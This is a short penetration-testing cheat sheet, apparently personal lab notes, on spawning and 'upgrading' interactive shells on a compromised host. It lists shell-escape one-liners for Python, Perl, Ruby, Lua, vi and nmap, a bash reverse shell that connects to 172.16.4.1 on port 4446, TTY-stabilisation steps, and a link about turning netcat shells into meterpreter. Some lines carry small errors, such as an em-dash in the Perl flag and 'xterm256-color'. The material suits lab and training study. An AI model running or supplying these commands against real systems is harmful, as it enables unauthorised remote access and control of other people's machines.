# Upgrading your Shell

I felt a new section was relevant simply based on the results I found from one of my sessions.
There are both a number of ways to establish a session (`netcat`, `bash`), as well as to upgrade your session.

```bash
# Get a shell from Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo os.system('/bin/bash')

# Get a new bash shell if the initial gets disconencted
/bin/sh -i

# Perl
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";

# Ruby
ruby: exec "/bin/sh"

#Lua
lua: os.execute('/bin/sh')

(From within IRB)
exec "/bin/sh"

(From within vi)
:!bash
:set shell=/bin/bash:shell

(From within nmap)
!sh


#!/bin/bash
/bin/bash -i >& /dev/tcp/172.16.4.1/4446 0>&1
```

### Upgrading a PTY

This is when you have the ability to get a python pty session -   
```bash
# Get the initial pty
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background my session
Ctrl-Z

# Check Current shell info - looking for my shell session to match the target to
echo $TERM

# Set the STTY to not echo
stty raw -echo

# Bring back the shell
fg

# Set the target shell settings to match my box
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 116
```

Additionally, [upgrade](https://github.com/chrisaboyd/Samples/blob/main/VHL/nc_to_meterpreter.md) your netcat shell to meterpreter!
